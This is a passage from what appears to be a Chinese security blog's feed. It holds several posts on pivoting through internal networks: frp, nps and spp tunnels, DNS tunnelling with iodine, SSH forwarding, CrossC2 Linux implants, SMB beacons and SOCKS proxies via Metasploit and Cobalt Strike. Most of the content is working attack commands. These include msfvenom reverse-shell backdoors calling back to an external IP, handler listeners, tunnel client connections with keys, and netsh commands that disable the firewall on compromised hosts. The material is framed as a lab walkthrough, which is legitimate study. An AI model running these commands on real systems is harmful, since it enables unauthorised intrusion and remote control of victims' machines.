shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=101.35.21.250 lport=6000 -f exe -o frp.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set pyload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 0.0.0.0</span><br><span class="line">set LPORT 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>3.靶机运行frp.exe即可</p><h2 id="Nps"><a href="#Nps" class="headerlink" title="Nps"></a>Nps</h2><p><a href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a></p><p>nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。</p><p>服务端：</p><p>1、启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./nps install</span><br><span class="line">./nps</span><br><span class="line">http://IP:8080/  </span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924111907415.png" alt="image-20220924111907415"></p><p>默认密码:admin&#x2F;123</p><p>2、创建客户端，生成密匙<br><img src="/posts/84ae0305/image-20220924112035204.png" alt="image-20220924112035204"></p><p>修改备注其他默认</p><p>3、添加协议隧道，绑定指向</p><p>添加客户端隧道<br><img src="/posts/84ae0305/image-20220924112305588.png" alt="image-20220924112305588"></p><p>远程绑定5555,指向本地6666<br><img src="/posts/84ae0305/image-20220924112733833.png" alt="image-20220924112733833"><br>该配置意思为肉鸡上线流量发到服务端5555端口服务端会转发到客户端6666端口</p><p>客户端：</p><p>1、连接服务端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./npc -server=101.35.21.250:8024 -vkey=uajwhbu9155qh89v #vkey为创建客户端生成的key</span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924113631604.png" alt="image-20220924113631604"></p><p>2、生成后门：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=101.35.21.250 lport=5555 -f exe -o nps.exe</span><br></pre></td></tr></table></figure><p>3、监听后门：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 0.0.0.0</span><br><span class="line">set LPORT 6666</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924113811812.png" alt="image-20220924113811812"></p><h2 id="Spp"><a href="#Spp" class="headerlink" title="Spp"></a>Spp</h2><p><a href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a><br>支持的协议：tcp、udp、udp、icmp、http、kcp、quic<br>支持的类型：正向代理、反向代理、socks5正向代理、socks5反向代理<br>在对抗项目中有遇到过一些极端环境，比如目标封了tcp，http等常用出网的协议，<br>但是icmp，dns等协议可能因为业务需要或者管理者安全意识不到位导致没有封干净。<br>在这种场景下就可以使用这些容易被忽视的协议进行隧道的搭建。</p><p>1、服务端：监听本地的icmp数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./spp -type server -proto ricmp -listen 0.0.0.0</span><br></pre></td></tr></table></figure><p>2、客户端：将本地的8082给到服务器8081上（TCP封装icmp）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spp -name &quot;test&quot; -type proxy_client -server 101.35.21.250 -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp</span><br></pre></td></tr></table></figure><p>3、CS</p><p>监听器1：http 101.35.21.250 8081<br>监听器2：http 127.0.0.1 8082<br>生成后门：监听器2 生成127.0.0.1的后门<br><img src="/posts/84ae0305/image-20220924105605481.png" alt="image-20220924105605481"><br>项目介绍中有更多的协议封装</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网隧道技术&amp;Linux上线</title>
      <link href="/posts/2cb05a91/"/>
      <url>/posts/2cb05a91/</url>
      
        <content type="html"><![CDATA[<h1 id="内网隧道技术-amp-Linux上线"><a href="#内网隧道技术-amp-Linux上线" class="headerlink" title="内网隧道技术&amp;Linux上线"></a>内网隧道技术&amp;Linux上线</h1><p>ICMP和SMB隧道在前面文章中已经实现</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="/posts/2cb05a91/A0zT3eux7IjxM1ELmIIAyg.png" alt="img"></p><p>windows服务器设置防火墙出站策略<br><img src="/posts/2cb05a91/image-20220922190239113.png" alt="image-20220922190239113"><br><img src="/posts/2cb05a91/image-20220922190257504.png" alt="image-20220922190257504"><br><img src="/posts/2cb05a91/image-20220922190314617.png" alt="image-20220922190314617"></p><p><img src="/posts/2cb05a91/Jv0uYt6ULlyZLAoBbdgBsg.png" alt="img"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iptables -F #清除所有规则</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT #允许包从22端口进入</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT #允许从22端口进入的包返回</span><br><span class="line">iptables -A OUTPUT -p udp --dport 53 -j ACCEPT #域名解析端口，一般不开</span><br><span class="line">iptables -A INPUT -p udp --sport 53 -j ACCEPT #域名解析端口，一般不开</span><br><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT #允许本机访问本机</span><br><span class="line">iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -s 0/0 --dport 80 -j ACCEPT #允许所有IP访问80端口</span><br><span class="line">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class="line">iptables-save &gt; /etc/sysconfig/iptables #保存配置</span><br><span class="line">iptables -L #显示iptables列表</span><br></pre></td></tr></table></figure><p>开启ssh协议登录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">PasswordAuthentication yes</span><br><span class="line">/etc/init.d/ssh start</span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure><h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p><strong>DNS在区域传输为TCP协议 在域名解析时为UDP协议</strong></p><p>判断：**windows:**nslookup<br>     **Linux:**dig<br><img src="/posts/2cb05a91/image-20220922190755393.png" alt="image-20220922190755393"><br>有回显说明可以使用dns协议</p><h3 id="1、上线环境"><a href="#1、上线环境" class="headerlink" title="1、上线环境"></a>1、上线环境</h3><p>内网主机只出网DNS协议数据，解决上线</p><p><strong>域名申请及配置</strong></p><p>先创建一个A记录类型记录值为cs服务端地址</p><p><img src="/posts/2cb05a91/image-20220922191723157.png" alt="image-20220922191723157"><br>然后创建NS记录类型记录值为创建的A型域名<img src="/posts/2cb05a91/image-20220922191705097.png" alt="image-20220922191705097"><br>当解析时ns1.fattyy.top会解析为cs.fattyy.top而cs.fattyy.top会解析为cs服务端地址</p><p><strong>监听器创建及配置</strong><br><img src="/posts/2cb05a91/image-20220922192958843.png" alt="image-20220922192958843"></p><p><strong>后门绑定监听器及生成</strong></p><p><img src="/posts/2cb05a91/image-20220922193108067.png" alt="image-20220922193108067"><br>运行木马<br><img src="/posts/2cb05a91/image-20220922223045482.png" alt="image-20220922223045482"><br>上线一个黑框<br>会话交互输入checkin<br><img src="/posts/2cb05a91/image-20220922223425217.png" alt="image-20220922223425217"></p><h3 id="2、通讯环境"><a href="#2、通讯环境" class="headerlink" title="2、通讯环境"></a>2、通讯环境</h3><p>内网主机只出网DNS协议数据，解决通讯，但有点鸡肋需要在目标机执行命令……</p><p>项目:<a href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></p><p><strong>服务器：</strong>设置密码test并创建虚拟IP及绑定域名指向</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iodined -f -c -P test 192.168.0.1 ns1.fattyy.top -DD</span><br></pre></td></tr></table></figure><p><img src="/posts/2cb05a91/image-20220923083523457.png" alt="image-20220923083523457"><br><img src="/posts/2cb05a91/image-20220923083542470.png" alt="image-20220923083542470"><br>可以看到多出来一个192.168.0.1的网卡</p><p><strong>客户端：</strong>连接密码test并绑定域名指向</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iodine -f -M 200 -P test ns1.fattyy.top</span><br></pre></td></tr></table></figure><p><img src="/posts/2cb05a91/image-20220923083824757.png" alt="image-20220923083824757"><br><img src="/posts/2cb05a91/image-20220923083859004.png" alt="image-20220923083859004"></p><p>服务端尝试通讯尝试连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.0.4</span><br></pre></td></tr></table></figure><p><img src="/posts/2cb05a91/image-20220923084159924.png" alt="image-20220923084159924"><br>成功通讯</p><h2 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h2><p>由于SSH协议存在于Linux系统，跳板机必须Linux</p><p>**条件:**需要取得一个root权限的linux系统<br>由于CS无SSH协议监听器配置，无法上线</p><p>本地：出站协议被封</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将目标机:80端口流量转发到跳板机:1122</span></span><br><span class="line">ssh -CfNg -L 1122:192.168.1.15:80 root@192.168.1.166</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">跳板机接收流量</span></span><br><span class="line">curl http://127.0.0.1:1122</span><br></pre></td></tr></table></figure><p><img src="/posts/2cb05a91/image-20220923091654829.png" alt="image-20220923091654829"><br>需要输入跳板机密码<br><img src="/posts/2cb05a91/image-20220923092027085.png" alt="image-20220923092027085"></p><p>远程：入站协议被封</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将目标机:80端口流量转发到远程攻击机:1234</span></span><br><span class="line">ssh -CfNg -R 1234:192.168.1.15:80 root@47.94.236.117</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">远程攻击机接受流量</span></span><br><span class="line">curl http://127.0.0.1:1234</span><br></pre></td></tr></table></figure><p><img src="/posts/2cb05a91/image-20220923092318305.png" alt="image-20220923092318305"></p><h2 id="CrossC2-Linux上线"><a href="#CrossC2-Linux上线" class="headerlink" title="CrossC2-Linux上线"></a>CrossC2-Linux上线</h2><p>项目地址:<a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a><br>使用参考:<a href="https://gloxec.github.io/CrossC2/zh_cn/">https://gloxec.github.io/CrossC2/zh_cn/</a><br>搭建参考:<a href="https://blog.csdn.net/weixin_42742658/article/details/122844041">https://blog.csdn.net/weixin_42742658/article/details/122844041</a></p><p>面向Linux Mac IOS Android系统上线支持<br>1、插件使用<br>cs加载三个cna文件<br><img src="/posts/2cb05a91/image-20220923152252183.png" alt="image-20220923152252183"><br>修改CrossCut-githubbot.cna文件<br><img src="/posts/2cb05a91/image-20220923195431436.png" alt="image-20220923195431436"><br><code>$CC2_PATH</code>为genCrossC2.Linux的路径<br><code>$CC2_BIN</code>生成linux木马就选择genCrossC2.Linux mac木马就选genCrossC2.mac<br>生成后门<br><img src="/posts/2cb05a91/image-20220923152347027.png" alt="image-20220923152347027"><br><img src="/posts/2cb05a91/image-20220923192133726.png" alt="image-20220923192133726"><br><img src="/posts/2cb05a91/image-20220923193715577.png" alt="image-20220923193715577"><br>将命令复制到服务器上执行即可生成木马<br>给执行权限然后运行上线<br><img src="/posts/2cb05a91/image-20220923192010159.png" alt="image-20220923192010159"><br><img src="/posts/2cb05a91/image-20220923234755158.png" alt="image-20220923234755158"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多层内网不出网绕过防火墙SMB隧道&amp;转发上线</title>
      <link href="/posts/59813d6f/"/>
      <url>/posts/59813d6f/</url>
      
        <content type="html"><![CDATA[<h1 id="多层内网不出网绕过防火墙SMB隧道-amp-转发上线"><a href="#多层内网不出网绕过防火墙SMB隧道-amp-转发上线" class="headerlink" title="多层内网不出网绕过防火墙SMB隧道&amp;转发上线"></a>多层内网不出网绕过防火墙SMB隧道&amp;转发上线</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="/posts/59813d6f/QfozOFxpvTuyPpTabJC3MA.png" alt="QfozOFxpvTuyPpTabJC3MA"></p><p>各个系统的网卡配置见上篇文章，区别就是Server2008和Server2012的防火墙</p><p>Server2008<br><img src="/posts/59813d6f/image-20220918235727419.png" alt="image-20220918235727419"></p><p>Server2012<br><img src="/posts/59813d6f/image-20220918235956279.png" alt="image-20220918235956279"></p><h2 id="Win7-amp-Win10上线"><a href="#Win7-amp-Win10上线" class="headerlink" title="Win7&amp;Win10上线"></a>Win7&amp;Win10上线</h2><p>这两个主机的上线方式和上篇文章相同，先拿到win7shell然后正向链接win10，详情可以看上篇文章<br><img src="/posts/59813d6f/image-20220919091420122.png" alt="image-20220919091420122"></p><h2 id="Server2008上线-转发"><a href="#Server2008上线-转发" class="headerlink" title="Server2008上线-转发"></a>Server2008上线-转发</h2><p>这里和上篇文章不同的是多了一个防火墙只让访问web服务也就是只有80端口,那么以前的正向链接思路也就行不通了，因为只可以访问80端口可以访问，如果创建一个80的木马又和web服务有冲突。<br>所以要想拿下Server2008就要使用反向拦截将数据发送给win10然后再转发给攻击机，但是直接建立192.168.22.130监听的马win10并不会转到我们的攻击机<br>所以Win10建立一个转发上线监听器<br><img src="/posts/59813d6f/image-20220919130210004.png" alt="image-20220919130210004"><br><img src="/posts/59813d6f/image-20220919130613533.png" alt="image-20220919130613533"><br>然后创建该监听器的马<br><img src="/posts/59813d6f/image-20220919131055422.png" alt="image-20220919131055422"><br>server2008执行上线<br><img src="/posts/59813d6f/image-20220919131155812.png" alt="image-20220919131155812"><br>看一下拓扑视图<br><img src="/posts/59813d6f/image-20220919131325903.png" alt="image-20220919131325903"><br>可以看到Server2008将数据转到Win10达成上线</p><h2 id="Server2012上线-smb隧道"><a href="#Server2012上线-smb隧道" class="headerlink" title="Server2012上线-smb隧道"></a>Server2012上线-smb隧道</h2><p>这里又有一个坑,如果继续使用反向链接去链接Server2008那么就触发了2008的入站规则直接gg,但同时他又有入站规则正向连接也gg,那就没办法上线了么,当然是有方法的就是通过smb隧道进行通讯<br><strong>什么是smb</strong><br>smb是一种协议名，smb服务的作用在于计算机间共享文件、打印机和串口等。<br>CS建立smb监听器<br><img src="/posts/59813d6f/image-20220919151313190.png" alt="image-20220919151313190"><br>注意smb监听器不能生成木马应为他并没有目标地址和端口,而是建立smb隧道,让后借助横向移动的方法达到上线<br>先借助2008对内网进行扫描<br><img src="/posts/59813d6f/image-20220919151850690.png" alt="image-20220919151850690"><br><img src="/posts/59813d6f/image-20220919151906193.png" alt="image-20220919151906193"></p><p>扫描完整后到目标列表进行横向移动<br><img src="/posts/59813d6f/image-20220919185045712.png" alt="image-20220919185045712"><br>输入主机密码（可通过前期信息搜集获得，见以前文章)<br>监听器选择之前创建的smb<br>会话选择Server2008<br><img src="/posts/59813d6f/image-20220919190150560.png" alt="image-20220919190150560"><br>成功上线</p><h3 id="其他上线方法"><a href="#其他上线方法" class="headerlink" title="其他上线方法"></a>其他上线方法</h3><p>我们已经拿到了Server2008的shell可以通过shell把命令关了</p><p>Windows防火墙命令：<br><a href="https://www.cnblogs.com/tomtellyou/p/16300557.html">https://www.cnblogs.com/tomtellyou/p/16300557.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看当前防火墙状态：</span></span><br><span class="line">netsh advfirewall show allprofiles</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭防火墙：</span></span><br><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启防火墙：</span></span><br><span class="line">netsh advfirewall set allprofiles state on</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">恢复初始防火墙设置：</span></span><br><span class="line">netsh advfirewall reset</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">启用桌面防火墙:</span> </span><br><span class="line">netsh advfirewall set allprofiles state on</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">设置默认输入和输出策略：</span></span><br><span class="line">netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果设置为拒绝使用blockinbound,blockoutbound</span></span><br></pre></td></tr></table></figure><p>注意cs执行shell命令必须在会话交互窗口输入shell 然后再加执行的命令<br>关闭防火墙<br><img src="/posts/59813d6f/image-20220919224422050.png" alt="image-20220919224422050"><br>再以Server2008创建一个转发上线监听器<br><img src="/posts/59813d6f/image-20220919224827880.png" alt="image-20220919224827880"><br>创建该监听器的木马传到Server2012执行<br><img src="/posts/59813d6f/image-20220919225001754.png" alt="image-20220919225001754"><br>再次上线<br><img src="/posts/59813d6f/image-20220919225052334.png" alt="image-20220919225052334"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>进行内网渗透是要根据防火墙的规则来选择上线方式,可以先测试可以利用了那些协议icmp，tcp，smb等等<br>如果防火墙规则无法关闭是否可以通过关闭其中一个主机的防火墙来达到上线效果<br>但是关闭防火墙这种方法单纯的内网环境如果是域策略同步这种那么这种方法将失效</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多层内网不出网Socks代理通讯上线</title>
      <link href="/posts/c4250965/"/>
      <url>/posts/c4250965/</url>
      
        <content type="html"><![CDATA[<h1 id="多层内网不出网Socks代理通讯上线"><a href="#多层内网不出网Socks代理通讯上线" class="headerlink" title="多层内网不出网Socks代理通讯上线"></a>多层内网不出网Socks代理通讯上线</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>在内网渗透中会遇到众多内网机器不出网的情况,对渗透工作造成阻碍，这就需要代理技术来进一步对内网机器进行控制，通过内网中一台出网主机为节点对其他不出网主机建立通讯，从而达到被控。本文以MSF和CS两个主流工具进行测试</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="/posts/c4250965/LLc4qeTwaCOdzdGYloBkCQ.png" alt="LLc4qeTwaCOdzdGYloBkCQ"></p><p>VMware添加网卡<br><img src="/posts/c4250965/image-20220917101457747.png" alt="image-20220917101457747"><br>Win7<br><img src="/posts/c4250965/image-20220917102725290.png" alt="image-20220917102725290"><br>Win10<br><img src="/posts/c4250965/image-20220917102609833.png" alt="image-20220917102609833"><br>Server2008<br><img src="/posts/c4250965/image-20220917111247738.png" alt="image-20220917111247738"><br>Server2012<br><img src="/posts/c4250965/image-20220917111349341.png" alt="image-20220917111349341"><br>整个环境只有Win7可以出网其他主机均不能访问外网<br>搭建完成后在各系统下安装一个web界面方便测试<br>为了方便所有后门都通过vmtools拉到虚拟机 实战环境要测试如何传马</p><p>**背景介绍:**现在已经控制Win7需要进一步向下渗透，常规思路可以将工具上传到win7然后一层一层向下渗透，但是实际环境下工具太大，被杀，需要安装等问题都会阻拦继续向下渗透，可以以win7为节点实现攻击机向win10通讯，其他主机思路相同</p><p>Win7拿shell<br>msf</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom - p windows/metmsfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=3333 -f exe &gt; xd.exe</span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>运行后门上线<br>cs直接生成后门运行上线<br>由于后面的主机不出网我们的攻击机无法建立通讯，所以应该想办法建立通讯才可以继续后面的操作</p><h2 id="Win10通讯-amp-上线"><a href="#Win10通讯-amp-上线" class="headerlink" title="Win10通讯&amp;上线"></a>Win10通讯&amp;上线</h2><h3 id="MSF通讯"><a href="#MSF通讯" class="headerlink" title="MSF通讯"></a>MSF通讯</h3><p>1、添加路由</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p #查看当前路由</span><br><span class="line">run post/multi/manage/autoroute </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加指定路由，1是接收的session编号 一般使用上方命令即可</span></span><br><span class="line">route add 192.168.11.0 255.255.255.0 1</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917153408096.png" alt="image-20220917153408096"><br><img src="/posts/c4250965/image-20220917153614689.png" alt="image-20220917153614689"><br>现在就有了内网段的路由<br>但是这只实现了msf可以和内网实现通讯，其他工具并不能建立连接，还需要使用sock来进一步建立连接</p><p>2、Sock代理<br><img src="/posts/c4250965/image-20220917154311496.png" alt="image-20220917154311496"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">先将win7会话置于后台</span></span><br><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 0.0.0.0</span><br><span class="line">set srvport 1122</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917154550252.png" alt="image-20220917154550252"></p><p>启用代理软件配置Sock5代理<br>这里使用浏览器插件Proxy SwitchyOmega<br><img src="/posts/c4250965/image-20220917160200742.png" alt="image-20220917160200742"><br>添加完成后选择使用代理访问内网地址 192.168.11.129<br><img src="/posts/c4250965/image-20220917155232079.png" alt="image-20220917155232079"><br>成功访问<br>也可以使用其他代理工具:SocksCap Proxifier ProxyChains等</p><h3 id="CS通讯"><a href="#CS通讯" class="headerlink" title="CS通讯"></a>CS通讯</h3><p><img src="/posts/c4250965/image-20220917161138881.png" alt="image-20220917161138881"><br><img src="/posts/c4250965/image-20220917161213025.png" alt="image-20220917161213025"><br>注意CS的代理协议为cocks4a<br><img src="/posts/c4250965/image-20220917163512573.png" alt="image-20220917163512573"><br><img src="/posts/c4250965/image-20220917163546627.png" alt="image-20220917163546627"><br>访问成功</p><h3 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h3><p>目前为止成功与win10建立通讯接下来要想办法将win10上线 因为win10没有办法出网所以采用正向连接的方法进行上线<br>上传一个127.0.0.1 9090的木马将流量指向本地9090端口,然后我们去连接9090端口<br><img src="/posts/c4250965/image-20220917190253795.png" alt="image-20220917190253795"><br>生成该监听器的木马<br><img src="/posts/c4250965/image-20220917172159222.png" alt="image-20220917172159222"><br>win10运行该木马<br>CS命令行–win7会话交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 192.168.11.129 9090</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917190235166.png" alt="image-20220917190235166"></p><p>成功上线</p><h3 id="MSF上线"><a href="#MSF上线" class="headerlink" title="MSF上线"></a>MSF上线</h3><p>思路和CS上线相同依旧是正向连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">后门生成</span></span><br><span class="line">msfvenom -p windows/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=3333 -f exe &gt; bd.exe</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">监听</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.11.129</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>win10运行后门</p><p><img src="/posts/c4250965/image-20220917191306644.png" alt="image-20220917191306644"></p><p>上线成功</p><h2 id="Server2008通讯-amp-上线"><a href="#Server2008通讯-amp-上线" class="headerlink" title="Server2008通讯&amp;上线"></a>Server2008通讯&amp;上线</h2><p>前面已经拿到Win10的shell了那么后面主机的通讯问题解决方案也和上面相同</p><h3 id="CS通讯-amp-上线"><a href="#CS通讯-amp-上线" class="headerlink" title="CS通讯&amp;上线"></a>CS通讯&amp;上线</h3><p>既然已经拿到win10已经上线了那么可以直接使用socks代理<br><img src="/posts/c4250965/image-20220917192353737.png" alt="image-20220917192353737"><br><img src="/posts/c4250965/image-20220917192601813.png" alt="image-20220917192601813"><br><img src="/posts/c4250965/image-20220917192607786.png" alt="image-20220917192607786"><br>成功通讯，上线操作也和上文相同 直接把上文生成的马传到server2008运行执行connect命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 192.168.22.131 9090</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917193416637.png" alt="image-20220917193416637"></p><p><img src="/posts/c4250965/image-20220917193255443.png" alt="image-20220917193255443"></p><h3 id="MSF通讯-amp-上线"><a href="#MSF通讯-amp-上线" class="headerlink" title="MSF通讯&amp;上线"></a>MSF通讯&amp;上线</h3><p>来到win10的shell添加路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917194155018.png" alt="image-20220917194155018"></p><p>建立socks代理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 0.0.0.0</span><br><span class="line">set srvport 2244</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917194355153.png" alt="image-20220917194355153"></p><p>接下来上线思路和上文相同直接用上文的马,只需改监听器目标即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set rhost 192.168.22.131</span><br><span class="line">set lport 3333</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/c4250965/image-20220917194646969.png" alt="image-20220917194646969"></p><h2 id="Server2012通讯-amp-上线"><a href="#Server2012通讯-amp-上线" class="headerlink" title="Server2012通讯&amp;上线"></a>Server2012通讯&amp;上线</h2><h3 id="CS通讯-amp-上线-1"><a href="#CS通讯-amp-上线-1" class="headerlink" title="CS通讯&amp;上线"></a>CS通讯&amp;上线</h3><p>思路依旧<br><img src="/posts/c4250965/image-20220917195540934.png" alt="image-20220917195540934"><br><img 